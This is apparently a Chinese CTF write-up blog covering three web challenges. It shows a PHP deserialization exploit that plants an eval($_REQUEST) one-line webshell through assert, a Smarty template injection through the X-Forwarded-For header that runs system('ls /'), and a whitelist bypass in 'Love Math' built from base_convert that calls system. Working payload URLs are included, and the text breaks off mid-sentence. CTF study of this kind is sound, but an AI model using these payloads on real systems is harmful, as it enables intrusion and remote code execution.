title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>进环境发现是这么个东西，尝试右键看源码没啥反应，直接在URL加<code>view-source:</code></p><p><img src="/img/real1.png" alt="real1"></p><p>发现有这么个东西，直接访问：<code>./time.php?source</code>(本来还想拿dirsearch扫来着，看来没必要了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//相当于调用了b这个函数而且参数是a，可以通过这个执行命令</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))  <span class="hljs-comment">//若source被赋值，高亮源码并die(0)结束。后面要给data赋值</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<span class="hljs-comment">//反序列化GET传的data</span><br><br><br><span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">04</span> <span class="hljs-number">12</span>:<span class="hljs-number">27</span>:<span class="hljs-number">15</span><br><br><br><br></code></pre></td></tr></table></figure><p>现在思路就清晰了，直接构造我们想执行的命令就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;eval&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不过没有运行？后面换了其它的命令也是没有回显。感觉是被过滤了(可以执行命令的函数有很多)，但也想不到其它思路，去看了其它师傅的wp发现要用<code>assert</code>这个函数，正好借这个机会梳理一下<code>RCE</code>中常用的几个命令执行函数，还有他们之间的关系：</p><p>我个人认为最常见的肯定是<code>eval</code>和<code>system</code>，先说下它俩之间最大的差别(个人观点)：</p><p><strong>eval类型函数是代码执行而不是命令执行</strong></p><p><strong>system类型函数是命令执行而不是代码执行</strong>，举几个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);    <span class="hljs-comment">//2,注意末尾的分号</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);  <span class="hljs-comment">//1+1;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$num</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$a = <span class="hljs-subst">$num</span>;&quot;</span>);   <span class="hljs-comment">//只有这个并无任何回显，可通过echo或var_dump获得回显</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;\$b = <span class="hljs-subst">$num</span>;&quot;</span>);   <br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//显示1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//显示NULL</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);   <span class="hljs-comment">//phpinfo()被执行</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);  <span class="hljs-comment">//phpinfo()不被执行</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);    <span class="hljs-comment">//whoami命令被执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);      <span class="hljs-comment">//whoami命令不被执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(whoami);&quot;</span>); <span class="hljs-comment">//执行成功，注意和上一条的区别</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//我们也可以把system和eval组合使用</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<span class="hljs-comment">// &quot;system(&#x27;whoami&#x27;);&quot;; 也行，但注意后面的分号一定不能丢掉</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//回显 viper3\rdj</span><br></code></pre></td></tr></table></figure><p>接下来这个<code>echo $b($a)</code>也有点说法，这东西有人叫它<code>变量函数</code>，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;eval(&#x27;phpinfo();&#x27;)&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//回显phpinfo的内容，但是：</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;eval&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//这东西没有任何结果</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//这段代码也能phpinfo</span><br></code></pre></td></tr></table></figure><p>先说下这个<code>assert</code>函数：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`assert()`函数接受一个表达式作为参数，并对该表达式进行求值。如果表达式为真，则继续执行后续代码；如果表达式为假，则触发一个致命错误，终止脚本的执行。但它也可以执行任意的PHP代码，包括执行命令。这是因为`assert()`函数在执行时会将传入的字符串作为PHP代码进行解析和执行。<br></code></pre></td></tr></table></figure><p>至于为什么不能只单纯用一个<code>eval</code>，原因是PHP中不能以变量函数的形式去调用它：eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用。</p><p>可以上传一个简单的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;eval($_REQUEST[3]);&#x27;</span>;<span class="hljs-comment">//REQUEST方法，传完了用GET、POST、COOKIE都行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;assert&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先用<code>scandir</code>函数看看根目录底下都有啥东西：</p><p><code>time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=var_dump(scandir(&#39;/&#39;));</code></p><p>注意要用分号结尾！否则不能被执行！用<code>var_dump</code>的原因是这函数会返回数组</p><p><img src="/img/scandir2.png" alt="scandir2"></p><p>有个<code>FIag_!S_it</code>，<code>system</code>被禁了所以用不了<code>cat</code>，尝试<code>file_get_contents</code>直接读，但是假的<code>flag</code>：</p><p><code>echo(file_get_contents(&#39;/FIag_!S_it&#39;));</code></p><p>注意这个<strong>不能</strong>写成：</p><p><code>echo(&quot;file_get_contents(&#39;/FIag_!S_it&#39;)&quot;);</code>，这个命令会显示<code>file_get_contents(&#39;/FIag_!S_it&#39;)</code></p><p><img src="/img/scandir5.png" alt="scandir5"></p><p>用蚁剑连接看看怎么个事：</p><p><code>http://1730f221-b91f-4b8b-b19d-8ce0eb0211e5.node4.buuoj.cn:81/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A&#123;s%3A1%3A%22a%22%3Bs%3A19%3A%22eval(%24_REQUEST[3])%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B&#125;</code></p><p><img src="/img/scandir4.png" alt="scandir4"></p><p><img src="/img/scandir3.png" alt="scandir3"></p><p>没有任何东西，应该是没权限。</p><p>看师傅们的<code>wp</code>都是去<code>phpinfo()</code>找，<code>ctrl+f</code>搜索就行。</p><p><code>payload:time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=phpinfo();</code></p><p>再补充下<code>scandir()</code>这个函数：</p><p><code>scandir()</code>函数会接受一个目录路径作为参数，并返回一个数组，包含该目录中的所有文件和子目录的名称。返回的数组中，每个元素表示目录中的一个文件或子目录的名称。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;../WWW&#x27;</span>;<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> ;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/scandir1.png" alt="scandir1"></p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>进去发现是个和<code>IP</code>有关的页面，右上角显示了我们的公网<code>IP</code>：</p><p><img src="/img/web11-1.png" alt="web11-1"></p><p>下面甚至有请求包的完整信息：</p><p><img src="/img/web11-2.png" alt="web11-2"></p><p>既然它获取了<code>IP</code>那大概率可以想到<code>XFF</code>伪造，抓包试试看：</p><p><img src="/img/web11-3.png" alt="web11-3"></p><p>确实是这样，但有什么用？这题明显不是利用XFF的SQL注入，想到之前做过一道好像叫<code>cookie is so stable</code>的题，通过模板注入解题，试试看：</p><p><code>X-Forwarded-For:&#123;7*7&#125;</code></p><p><img src="/img/web11-5.png"></p><p>还真是，老规矩先判断是什么类型的，再试试:<code>X-Forwarded-For:a&#123;*comment*&#125;b</code></p><p><img src="/img/wweb11-6.png" alt="wweb11-6"></p><p>应该是<code>Smarty</code>模板，个人认为这个模板最大的特点就是可以直接执行命令，在<code>XFF</code>直接输入：<code>&#123;system(&#39;ls /&#39;)&#125;</code>去找<code>flag</code>，然后直接<code>cat</code>读就行了。</p><p>其实这题底下有行小字提示了：<code>Build With Smarty !</code></p><p><img src="/img/smarty1.png" alt="smarty1"></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>看题目可能跟<code>MD5</code>有关？</p><p>直接给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123; <span class="hljs-comment">//GET传参，c不被定义就高亮源码</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<span class="hljs-comment">//后面两个依靠\来转义</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题花了很长时间没解出来，因为一直在想怎么去绕过黑名单和正则匹配去执行命令，后面看了<code>wp</code>才知道要利用给的函数去做，参考了这位师傅的文章<code>https://www.cnblogs.com/20175211lyz/p/11588219.html</code></p><p><code>https://www.anquanke.com/post/id/220813#h3-2</code></p><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>主要是<code>base_convert()</code>函数和<code>dechex</code>函数的使用：</p><p><img src="/img/baseconvert.png" alt="baseconvert"></p><p>可以看到这东西的范围是<code>2-36</code>，正好覆盖了<code>0-9,a-z</code>。<code>dechex</code>函数用于将十进制数转换为十六进制数。它接受一个十进制数作为参数，并返回一个表示相应十六进制数的字符串。</p><p>先看<code>wp</code>怎么写的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   <span class="hljs-comment">//hex2bin将一串16进制数转换为二进制字符串</span><br>(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  <span class="hljs-comment">//&#123;&#125;可以代替[]</span><br></code></pre></td></tr></table></figure><p><code>payload</code>：</p><p><code>/index.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=&lt;command&gt;</code></p><p>因为师傅写的很详细还是很好理解的：先利用<code>base_convert</code>函数转出一个<code>hex2bin</code>，再利用<code>dechex</code>转出一个十六进制字符串，前函后参组合转出<code>_GET</code>.</p><p><code>base_convert</code>遇到<code>36</code>进制时会转换成小写字母，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：a</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(A,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：10，转回去并不存在这个问题。</span><br></code></pre></td></tr></table></figure><p>后面就很好理解了，它会直接<code>eval</code>过滤后的<code>c</code>。执行后<code>c</code>&#x3D;<code>$pi</code>&#x3D;<code>_GET</code>，<code>$$pi</code>&#x3D;<code>$_GET</code>。再利用$_GET{0}($_GET{1})去执行函数就好。即使<code>[]</code>被过滤了仍可以使用<code>&#123;&#125;</code>绕过。构造完<code>_GET</code>后还需要引入一个变量来作为函数执行, 例如 <code>$a()</code>, 我们用 <code>$pi</code> 以绕过白名单的检测。</p><h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>利用<code>getallheaders</code>去解题：</p><p><code>payload:/index.php?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code>注意这个<code>getallheaders的用法</code></p><p>首先为什么是30进制(参考了<code>bfengj</code>师傅的文章)：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">Warning<br>由于使用内部的 “double” 或 “<span class="hljs-attribute">float</span>” 类型，<span class="hljs-built_in">base_convert</span>() 的操作可能会导致大数值中的精度丢失。请参见本手册的 浮点数 章节以便获得更多详细信息。<br><br>经过大师父们的测试，<span class="hljs-number">31</span>-<span 